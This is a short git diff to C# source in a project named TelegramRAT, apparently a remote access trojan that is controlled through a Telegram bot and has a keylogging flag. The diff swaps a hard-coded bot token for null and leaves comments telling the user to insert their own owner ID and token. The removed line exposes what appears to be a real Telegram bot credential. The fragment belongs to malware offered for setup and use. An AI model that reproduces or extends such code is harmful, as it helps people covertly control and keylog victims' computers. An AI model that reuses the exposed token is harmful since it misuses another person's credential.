@@ -23,8 +23,8 @@ namespace TelegramRAT
     {
         private static TelegramBotClient Bot;
 
-        readonly static long? OwnerId = null; // Place your Telegram id here or leave null
-        readonly static string BotToken = "1727211141:AAFgdia7tmGOzdeaPT_H0ZSlwe3PS2GnSlc"; // Place your Telegram bot token. 
+        readonly static long? OwnerId = null; // Place your Telegram id here or keep it null
+        readonly static string BotToken = null; // Place your Telegram bot token. 
 
         static List<BotCommand> commands = new List<BotCommand>();
         static bool keylog = false;
